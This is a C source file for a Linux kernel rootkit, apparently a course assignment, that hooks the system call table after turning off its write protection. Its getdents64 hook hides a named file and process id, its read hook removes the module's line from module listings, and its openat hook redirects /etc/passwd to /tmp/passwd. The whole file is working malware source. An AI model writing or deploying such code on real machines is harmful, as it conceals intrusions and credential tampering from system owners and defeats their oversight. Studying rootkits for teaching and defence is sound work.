#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include <linux/string.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

static char * spid = "";
module_param(spid, charp , 0);
//This is a pointer to the system call table
static unsigned long *sys_call_table;
MODULE_PARM_DESC(spid, "sneaky process id");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
  int byte_read = original_getdents64(regs);
  struct linux_dirent64 * dirent;
  int pos = 0;

  if(byte_read <= 0){
    return byte_read;
  }
  while(pos < byte_read){
    dirent = (struct linux_dirent64 *)((void *)regs->si + pos);
    // char[] sneaky_name = "sneaky_process";
    if(strcmp(dirent->d_name, "sneaky_process") == 0 || strcmp(dirent->d_name, spid) == 0){
      memmove((void *)dirent, (void *)dirent + dirent->d_reclen, byte_read - pos - dirent->d_reclen);
      byte_read -= dirent->d_reclen;
    }
    else{
      pos += dirent->d_reclen;
    }
  }
  return byte_read;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  
  char * match = NULL;
  char * endofline = NULL;
  ssize_t byte_read = original_read(regs);

  if(byte_read <= 0){
    return byte_read;
  }

  match = strstr((char *)regs->si, "sneaky_mod ");
  if(match == NULL){
    return byte_read;
  }
  endofline = strchr(match, '\n');

  if(endofline == NULL){
    return byte_read;
  }
  memmove((void *)match, (void *)(endofline+1), byte_read - ((void *)endofline + 1 - (void *)regs->si));
  byte_read -= (endofline + 1 - match);

  return (ssize_t)byte_read;
}


// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char * pathname = (char *)regs->si;
  char * change = "/tmp/passwd";
  // Implement the sneaky part here
  if(strcmp(pathname,"/etc/passwd") == 0){
    copy_to_user((void *)pathname, change, strlen(change));
  }
  return (*original_openat)(regs);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");